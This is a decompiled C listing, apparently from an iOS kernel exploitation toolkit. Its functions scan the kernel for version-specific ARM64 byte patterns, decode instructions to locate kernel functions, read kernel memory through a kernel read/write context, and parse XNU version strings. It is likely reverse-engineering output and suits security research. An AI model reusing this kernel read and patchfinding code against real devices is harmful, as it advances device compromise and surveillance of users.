unsigned __int64 __fastcall find_kread_pattern_versioned(__int64 a1, unsigned __int64 *a2, unsigned __int64 *a3)
{
  int v6; // w22
  char *v7; // x1
  unsigned __int64 result; // x0
  unsigned __int64 v9; // x23
  unsigned __int64 v10; // x22
  uint64_t v11[3]; // [xsp+8h] [xbp-48h] BYREF

  v6 = get_sptm_version_index(a1);
  macho_find_text_section(a1, v11);
  if ( v6 )
    v7 = "5F 00 00 71 20 01 00 54";
  else
    v7 = 0;
  result = kernel_pattern_scan((__int64)v11, v7, 0);
  if ( result )
  {
    v9 = result;
    result = (unsigned __int64)find_kernel_func_by_branch((__int64 *)a1, (__int64 *)(result + 8), 1);
    if ( result )
    {
      v10 = result;
      result = (unsigned __int64)find_kernel_func_by_branch((__int64 *)a1, (__int64 *)(v9 + 24), 1);
      if ( result )
      {
        result = kread_physmap_decorated(KRWCTX_FROM_RAW_FIELD(a1, 280), result, a2);
        if ( (uint32_t)result )
          return kread_physmap_decorated(KRWCTX_FROM_RAW_FIELD(a1, 280), v10, a3);
      }
    }
  }
  return result;
}

//----- (000000000001EA70) ----------------------------------------------------
__int64 __fastcall find_kernel_func_at_offset(struct_krwCtx *krwCtx, int a2)
{
  __int64 result; // x0
  __int64 v4; // x21
  __int64 *v5; // x19
  unsigned int v6; // w20
  const char *v7; // x8
  char *v8; // x1
  uint64_t v9[3]; // [xsp+8h] [xbp-38h] BYREF

  if ( a2 > 0 )
    return 0;
  v4 = KRWCTX_RAW_PTR(krwCtx) + 8LL * a2;
  result = *(uint64_t *)(v4 + 6496);
  if ( !result )
  {
    if ( a2 )
      return 0;
    v5 = krwCtx->kernelMachoCtx;
    v6 = get_sptm_version_index((__int64)v5);
    macho_find_text_section((__int64)v5, v9);
    v7 = "09 .. 00 F9 E1 03 00 32 00 00 80 52";
    if ( v6 != 1 )
      v7 = 0;
    if ( v6 <= 1 )
      v8 = (char *)v7;
    else
      v8 = "09 .. 00 F9 00 00 80 52 E1 03 00 32";
    result = kernel_pattern_scan((__int64)v9, v8, 0);
    if ( result )
    {
      result = (__int64)resolve_branch_target(v5, (__int64 *)(result + 12));
      if ( result )
        *(uint64_t *)(v4 + 6496) = result;
    }
  }
  return result;
}

//----- (000000000001EB2C) ----------------------------------------------------
char *__fastcall find_kernel_func_by_branch(__int64 *a1, __int64 *a2, int a3)
{
  char *v3; // x21
  unsigned int v7; // w0
  unsigned int v8; // w0
  __int64 v9; // x9
  unsigned __int64 v10; // x9
  char *v11; // x9
  unsigned int v13; // w23
  __int64 v14; // x8
  char v15; // w25
  int v16; // w23
  __int64 *v17; // x24
  __int64 *v18; // x22
  unsigned int v19; // w0
  __int64 v20; // x8
  bool v21; // cf
  unsigned __int64 v22; // x8

  if ( ((unsigned __int8)a2 & 3) != 0 )
    return 0;
  v7 = (unsigned int)macho_read_u32(a1, a2);
  if ( v7 == -721215457 )
  {
    v8 = (unsigned int)macho_read_u32(a1, (__int64 *)((char *)a2 + 4));
    v9 = (v8 >> 5) & 0x7FFFF;
    if ( ((v8 >> 5) & 0x40000LL) != 0 )
      v10 = (4 * v9) | 0xFFFFFFFFFFF00000LL;
    else
      v10 = 4 * v9;
    v11 = (char *)a2 + v10 + 4;
    if ( HIBYTE(v8) == 88 )
      return v11;
    else
      return 0;
  }
  v13 = v7;
  if ( (v7 & 0x9F000000) == 0x90000000 )
  {
    v3 = (char *)(((unsigned __int64)a2 & 0xFFFFFFFFFFFFF000LL) + (int)(((v7 >> 17) & 0x3000) | (v7 >> 5 << 14)));
  }
  else
  {
    if ( (v7 & 0x9F000000) != 0x10000000 || (unsigned int)macho_read_u32(a1, (__int64 *)((char *)a2 + 4)) != -721215457 )
      return 0;
    v14 = ((v13 >> 3) & 0x1FFFFC) | ((v13 >> 29) & 3);
    if ( (v14 & 0x100000) != 0 )
      v14 |= 0xFFFFFFFFFFE00000LL;
    v3 = (char *)a2 + v14;
  }
  v15 = 0;
  v16 = v13 & 0x1F;
  v17 = a2 + 4;
  v18 = (__int64 *)((char *)a2 + 4);
  while ( 1 )
  {
    v19 = (unsigned int)macho_read_u32(a1, v18);
    if ( (v19 & 0x7F000000) == 0x11000000 && (v15 & 1) == 0 )
    {
      if ( ((v19 >> 5) & 0x1F) == v16 )
      {
        v20 = (v19 >> 10) & 0xFFF;
        if ( (v19 & 0xC00000) != 0 )
          v20 <<= 12;
        v3 += v20;
        if ( !a3 || v16 != (v19 & 0x1F) )
          return v3;
        v15 = 1;
      }
      else
      {
        v15 = 0;
      }
    }
    if ( (v19 & 0xBFC00000) == 0xB9400000 && ((v19 >> 5) & 0x1F) == v16 )
    {
      v22 = (unsigned __int64)((v19 >> 10) & 0xFFF) << (v19 >> 30);
      goto LABEL_40;
    }
    if ( (v19 & 0xFFC00000) == 0xB9800000 )
      break;
    if ( (v19 & 0xFFC00000) == 0x39400000 && ((v19 >> 5) & 0x1F) == v16 )
    {
      v22 = (v19 >> 10) & 0xFFF;
      goto LABEL_40;
    }
LABEL_35:
    if ( v19 != -698416192 )
    {
      v21 = v17 >= v18;
      v18 = (__int64 *)((char *)v18 + 4);
      if ( v21 )
        continue;
    }
    return v3;
  }
  if ( ((v19 >> 5) & 0x1F) != v16 )
    goto LABEL_35;
  v22 = (v19 >> 8) & 0x3FFC;
LABEL_40:
  v3 += v22;
  return v3;
}

//----- (000000000001ED50) ----------------------------------------------------
__int64 __fastcall get_kernel_version_string_0(char *a1, size_t a2)
{
  host_t v4; // w0
  kern_return_t v5; // w0
  int v7; // w19
  int v8; // w8
  int v9[2]; // [xsp+8h] [xbp-238h] BYREF
  size_t v10; // [xsp+10h] [xbp-230h] BYREF
  kernel_version_t kernel_version; // [xsp+18h] [xbp-228h] BYREF

  if ( dyldVersionNumber < 800.0 )
  {
    v4 = mach_host_self();
    v5 = host_kernel_version(v4, kernel_version);
    if ( v5 )
      return v5 | 0x80000000;
    goto LABEL_8;
  }
  *(uint64_t *)v9 = 0x400000001LL;
  v10 = 512;
  if ( !sysctl(v9, 2u, kernel_version, &v10, 0, 0) )
  {
LABEL_8:
    if ( strlen(kernel_version) + 1 > a2 )
      return 708620;
    strlcpy(a1, kernel_version, a2);
    return 0;
  }
  v7 = errno;
  v8 = errno;
  if ( v7 < 0 )
    v8 = -v8;
  return v8 | 0x40000000u;
}

//----- (000000000001EE6C) ----------------------------------------------------
int __fastcall kernel_version_parse(struct_xnuMajorVersion *xnuMajorVersion, int *a2, int *a3)
{
  int result; // w0
  char *v7; // x0
  int v8; // w0
  size_t v9; // x0
  char *v10; // x0
  __int32 v11[8]; // [xsp+40h] [xbp-250h]
  unsigned __int64 v12; // [xsp+58h] [xbp-238h]
  char str[512]; // [xsp+58h] [xbp-238h] BYREF

  result = 0;
  memset(v11, 0, sizeof(v11));
  v12 = 0;
  if ( dyldVersionNumber >= 1000.0 )
  {
    __strlcpy_chk(str, ___kernelVersionString, 0x200u, 0x200u);
    v9 = strlen(str);
    if ( v9 )
    {
      if ( str[v9 - 1] == 10 )
        str[v9 - 1] = 0;
      if ( madvise(0, 0, 10) )
      {
        if ( errno == 45 )
        {
          v10 = strstr(str, "Libsyscall-");
          if ( v10 )
          {
            v8 = sscanf(v10, "Libsyscall-%d.%d.%d.%d.%d%*s", &v11[0], &v11[1], &v11[2], &v11[3], &v11[4]);
LABEL_13:
            if ( v8 >= 3 )
            {
              *a2 = 1;
              *a3 = 1;
              v11[5] = (v11[0] << 18) | ((v11[1] & 0x1FF) << 9) | (v11[2] & 0x1FF);
              *(uint64_t *)&v11[6] = ((((unsigned __int64)(v11[0] & 0x7FFF) << 20)
                                    | ((unsigned __int64)(v11[1] & 0x3FF) << 10)
                                    | (unsigned int)(v11[2] & 0x3FF)) << 20)
                                  | (((unsigned __int64)(unsigned int)v11[3] << 10) & 0xFFC00)
                                  | (unsigned int)(v11[4] & 0x3FF);
              v12 = 1;
              xnuMajorVersion->qword20 = v12;
              xnuMajorVersion->majorVersion = *(__int128 *)v11;
              xnuMajorVersion->oword10 = *(__int128 *)&v11[4];
              result = 1;
            }
          }
        }
      }
    }
  }
  else if ( !(unsigned int)get_kernel_version_string_0(str, 0x200u) )
  {
    if ( strstr(str, "RELEASE") )
    {
      v7 = strstr(str, "xnu-");
      if ( v7 )
      {
        v8 = sscanf(v7, "xnu-%d.%d.%d.%d.%d%*s", &v11[0], &v11[1], &v11[2], &v11[3], &v11[4]);
        goto LABEL_13;
      }
    }
  }
  return result;
}
